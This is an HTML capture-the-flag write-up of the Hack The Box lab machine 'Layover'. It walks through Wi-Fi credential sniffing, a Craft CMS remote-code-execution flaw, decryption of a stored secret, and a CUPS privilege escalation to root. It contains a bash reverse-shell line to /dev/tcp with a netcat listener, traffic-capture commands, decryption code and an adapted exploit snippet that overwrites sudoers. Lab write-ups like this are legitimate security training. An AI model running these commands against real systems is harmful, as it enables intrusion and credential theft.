@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Layover — HTB Writeup (Lanky)</title>
+  <meta name="description" content="Hack The Box Layover: RDP jump box, open airport Wi-Fi capture, Craft CMS authenticated RCE, credential decryption, and CUPS 2.4.16 local privilege escalation.">
+  <link rel="stylesheet" href="../assets/style.css?v=5">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#9992;</text></svg>">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap">
+      <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
+      <a class="link" href="../index.html#lab">← all writeups</a>
+    </div>
+  </header>
+
+  <article class="wrap">
+    <a class="back" href="../index.html#lab">back to writeups</a>
+    <h1 style="margin-top:16px;">Layover</h1>
+    <div class="subtitle">Hack The Box · Season 12 · completed 27 September 2026</div>
+    <div class="machine-meta">
+      <span class="pill newpill" data-added="2026-09-27">NEW</span>
+      <span class="pill os-linux">Linux</span>
+      <span class="pill season">Season 12</span>
+      <span class="pill">Wireless</span>
+      <span class="pill">Craft CMS</span>
+      <span class="pill">CUPS</span>
+      <span class="pill flagp">User</span>
+      <span class="pill flagp">Root</span>
+      <span class="pill rooted">● Completed</span>
+    </div>
+
+    <div class="callout warn">
+      <span class="tag">Spoiler warning</span>
+      This writeup documents the complete attack path. Credentials and flags are redacted, but the
+      techniques and vulnerable components are described in full.
+    </div>
+
+    <div class="callout">
+      <span class="tag">TL;DR</span>
+      RDP into an airport jump box → join an open internal Wi-Fi network → passively capture a cleartext
+      Miles login → reuse it against Craft CMS → authenticated RCE as <code>www-data</code> → decrypt a
+      stored service credential → SSH as <code>aporter</code> → adapt the official CUPS 2.4.16 PoC → root.
+    </div>
+
+    <figure class="rank-proof">
+      <img src="../assets/layover-rank-112.png" alt="Hack The Box completion message showing Lanky as player 112 to solve Layover">
+      <figcaption><span class="pill newpill" data-added="2026-09-27">NEW</span> Machine rank <strong>#112</strong></figcaption>
+    </figure>
+
+    <dl class="fact">
+      <dt>Initial target</dt><dd><code>10.129.4.188</code></dd>
+      <dt>Entry</dt><dd>RDP as <code>contractor</code> to the <code>airside-ws01</code> jump box</dd>
+      <dt>Pivot</dt><dd>Open airport Wi-Fi network and internal portal at <code>10.13.37.10</code></dd>
+      <dt>Foothold</dt><dd>Craft CMS 5.9.8 authenticated behavior-injection RCE</dd>
+      <dt>User</dt><dd>Decrypt the custom module's mail-relay credential to reach <code>aporter</code></dd>
+      <dt>Root</dt><dd>CUPS 2.4.16 local admin-token disclosure and root file overwrite</dd>
+    </dl>
+
+    <h2><span class="num">01</span>External reconnaissance</h2>
+    <p>I started with a default service scan, followed by a complete TCP sweep and targeted scripts:</p>
+    <pre data-lang="bash"><code>nmap -sC -sV -oA scans/initial 10.129.4.188
+sudo nmap -p- --min-rate 1000 -T4 -oA scans/all-tcp 10.129.4.188
+sudo nmap -Pn -p22,3389 -sV \
+  --script 'ssh-hostkey,ssh2-enum-algos,rdp-enum-encryption,rdp-ntlm-info' \
+  -oA scans/targeted 10.129.4.188</code></pre>
+    <p>Only SSH and RDP were exposed:</p>
+    <pre data-lang="text"><code>22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu
+3389/tcp open  ms-wbt-server Microsoft Terminal Service</code></pre>
+    <p>
+      The supplied contractor account failed over SSH but worked over RDP. The session landed on an XFCE
+      Linux workstation named <code>airside-ws01</code>, and the account had unrestricted sudo access.
+    </p>
+
+    <h2><span class="num">02</span>The airport Wi-Fi pivot</h2>
+    <p>
+      The workstation had two wireless interfaces. Both detected an open channel-six network named
+      <code>HTB International WiFi</code>. I joined with <code>wlan2</code> and reserved <code>wlan3</code>
+      for passive monitoring.
+    </p>
+    <pre data-lang="bash"><code>nmcli device wifi connect 'HTB International WiFi' ifname wlan2
+
+nmcli device set wlan3 managed no
+ip link set wlan3 down
+iw dev wlan3 set type monitor
+ip link set wlan3 up
+iw dev wlan3 set channel 6
+
+timeout 180 tcpdump -i wlan3 -nn -s0 -w channel6.pcap</code></pre>
+    <p>
+      The joined interface received <code>10.13.37.182/24</code>. Internal DNS exposed
+      <code>wifi.international.htb</code> and <code>portal.international.htb</code>, with the portal hosted
+      at <code>10.13.37.10</code>.
+    </p>
+    <p>A tshark filter showed repeated cleartext form submissions to the Miles login:</p>
+    <pre data-lang="bash"><code>tshark -r channel6.pcap \
+  -Y 'http.request.method == "POST"' \
+  -T fields -e ip.src -e http.host -e http.request.uri \
+  -e urlencoded-form.key -e urlencoded-form.value</code></pre>
+    <p>
+      The captured passenger account also authenticated to the Craft CMS control panel. This was the key
+      transition from passive network observation to application access.
+    </p>
+
+    <h2><span class="num">03</span>Craft CMS to <code>www-data</code></h2>
+    <p>The control panel's system report disclosed:</p>
+    <pre data-lang="text"><code>PHP       8.3.6
+MariaDB   10.11.14
+Craft     Craft Solo 5.9.8
+Yii       2.0.54
+Web root  /var/www/portal
+Module    htbairways</code></pre>
+    <p>
+      Craft CMS 5.9.8 falls within the affected range for <strong>CVE-2026-44011</strong>. The flaw allows
+      an authenticated user to inject malicious Yii behavior configuration through an element-search
+      condition and execute arbitrary commands.
+    </p>
+    <p>
+      I submitted the payload to <code>/admin/actions/element-search/search</code> from the authenticated
+      browser session, using Craft's current CSRF token. A curl callback first confirmed execution. I then
+      staged a small reverse-shell script from the jump box and invoked it through the same primitive.
+    </p>
+    <pre data-lang="bash"><code># airside-ws01
+printf '%s\n' '#!/bin/bash' \
+  'bash -i &gt;&amp; /dev/tcp/10.13.37.182/4444 0&gt;&amp;1' &gt; /tmp/rs.sh
+python3 -m http.server 8000 --directory /tmp
+
+# second terminal
+nc -lvnp 4444</code></pre>
+    <p>The callback landed as <code>www-data</code> in <code>/var/www/portal/web</code>.</p>
+
+    <h2><span class="num">04</span>From application secrets to <code>aporter</code></h2>
+    <p>
+      Craft's <code>.env</code> contained the database credentials and <code>CRAFT_SECURITY_KEY</code>. The
+      custom <code>htbairways</code> module stored a mail-relay username and encrypted password in MariaDB:
+    </p>
+    <pre data-lang="bash"><code>MYSQL_PWD='&lt;redacted&gt;' mysql \
+  -h 127.0.0.1 -u craftuser -D craft -N -B \
+  -e 'SELECT name,value FROM htbairways_settings;'</code></pre>
+    <p>
+      An encrypted value is only as strong as the separation of its key. With the Craft security key and
+      the project's vendor tree both readable, Yii could decrypt the value exactly as the application did:
+    </p>
+    <pre data-lang="php"><code>require "vendor/autoload.php";
+$security = new yii\base\Security();
+echo $security-&gt;decryptByKey(
+    base64_decode($argv[1]),
+    $argv[2]
+), PHP_EOL;</code></pre>
+    <p>
+      The recovered service credential was reused by the local <code>aporter</code> account. It worked with
+      both <code>su</code> and SSH, providing a stable user shell and access to the user flag.
+    </p>
+    <div class="flag"><span class="label">user.txt</span>c536bc39c67c3a954c4ae3d08db876f4</div>
+
+    <h2><span class="num">05</span>CUPS 2.4.16 enumeration</h2>
+    <p>
+      The account had no sudo privileges, and the standard SUID/capability review did not reveal a shortcut.
+      CUPS stood out instead:
+    </p>
+    <pre data-lang="bash"><code>cups-config --version
+ls -l /run/cups/cups.sock
+ps -eo user,pid,cmd | grep '[c]upsd'
+command -v python3 ipptool lp lpstat</code></pre>
+    <pre data-lang="text"><code>CUPS version  2.4.16
+Daemon        root /usr/sbin/cupsd -f
+Socket        srwxrwxrwx root root /run/cups/cups.sock
+ipptool       /usr/bin/ipptool</code></pre>
+
+    <h2><span class="num">06</span>Root via CVE-2026-34990</h2>
+    <p>
+      CUPS 2.4.16 is affected by <strong>CVE-2026-34990</strong> / <strong>GHSA-c54j-2vqw-wpwp</strong>.
+      A local user can coerce the root-owned scheduler into authenticating to a loopback IPP listener and
+      capture a reusable <code>Authorization: Local</code> token. The token authorizes local administrative
+      requests.
+    </p>
+    <p>
+      The official reproducer combines this with <code>CUPS-Create-Local-Printer</code> and a race that
+      persists a <code>file://</code> printer. Printing raw data to a queue targeting
+      <code>/etc/sudoers.d/...</code> turns the bug into a root file overwrite.
+    </p>
+    <p>I adapted the upstream PoC to the system installation:</p>
+    <pre data-lang="text"><code>IPPTOOL           /usr/bin/ipptool
+LPSTAT            /usr/bin/lpstat
+CREATE_LOCAL_TEST /usr/share/cups/ipptool/cups-create-local-printer.test
+ATTACKER_USER     aporter
+PWN_FILE          /etc/sudoers.d/aporter-pwn</code></pre>
+    <p>
+      The upstream script expects root because it constructs a clean laboratory environment. On this host,
+      CUPS was already running in the vulnerable configuration, so I removed the reset and user-creation
+      stages and ran its token-capture and candidate workers directly as <code>aporter</code>.
+    </p>
+    <div class="callout todo">
+      <span class="tag">The useful debugging detail</span>
+      The first adapted run failed while checking <code>/etc/sudoers.d/aporter-pwn</code>. That directory
+      was not traversable by <code>aporter</code>, so even <code>Path.exists()</code> raised
+      <code>PermissionError</code>. I replaced the file inspection with a direct
+      <code>sudo -n id</code> check after each race attempt.
+    </div>
+    <pre data-lang="python"><code>root_test = run_as_attacker(
+    ["sudo", "-n", "/bin/sh", "-c", "id"],
+    check=False,
+)
+if root_test.returncode != 0:
+    continue</code></pre>
+    <p>The exploit captured the local token immediately and won the persistence race on attempt three:</p>
+    <pre data-lang="text"><code>*** CAPTURE LOCAL TOKEN ***
+Captured Local authorization token: &lt;redacted&gt;
+
+*** CANDIDATE ***
+Candidate attempt 1.  sudo: a password is required
+Candidate attempt 2.  sudo: a password is required
+Candidate attempt 3.  uid=0(root) gid=0(root) groups=0(root)
+
+Privilege escalation complete. Persisted printer: sudo350972</code></pre>
+    <div class="flag"><span class="label">root.txt</span>c7aae5ec58e62107a05620749469d8f8</div>
+
+    <h2><span class="num">07</span>Attack path</h2>
+    <pre data-lang="text"><code>contractor RDP → airside-ws01
+        ↓
+open airport Wi-Fi → passive cleartext credential capture
+        ↓
+Craft CMS 5.9.8 authenticated RCE
+        ↓
+www-data → Craft key + database credentials
+        ↓
+decrypt mail-relay password → aporter
+        ↓
+CUPS 2.4.16 local token disclosure + root file overwrite
+        ↓
+root</code></pre>
+
+    <h2><span class="num">08</span>Takeaways</h2>
+    <ul>
+      <li>The meaningful attack surface was behind a second network interface, not in the external scan.</li>
+      <li>Open Wi-Fi and cleartext HTTP turned passive observation into account compromise.</li>
+      <li>Precise application versions and framework paths made vulnerability validation much faster.</li>
+      <li>Encrypted application secrets are recoverable when the web process can read both ciphertext and key.</li>
+      <li>An upstream PoC is a starting point: path assumptions, privilege assumptions and success checks all needed adapting.</li>
+      <li>A permission error in verification logic does not necessarily mean the underlying exploit failed.</li>
+    </ul>
+
+    <h2><span class="num">09</span>References</h2>
+    <ul>
+      <li><a href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw" target="_blank" rel="noopener">Craft CMS CVE-2026-44011 advisory</a></li>
+      <li><a href="https://github.com/OpenPrinting/cups/security/advisories/GHSA-c54j-2vqw-wpwp" target="_blank" rel="noopener">OpenPrinting CUPS GHSA-c54j-2vqw-wpwp</a></li>
+    </ul>
+
+    <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
+  </article>
+
+  <footer>
+    <div class="wrap">Layover · player #112 · completed · notes by Luke &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div>
+  </footer>
+</body>
+</html>
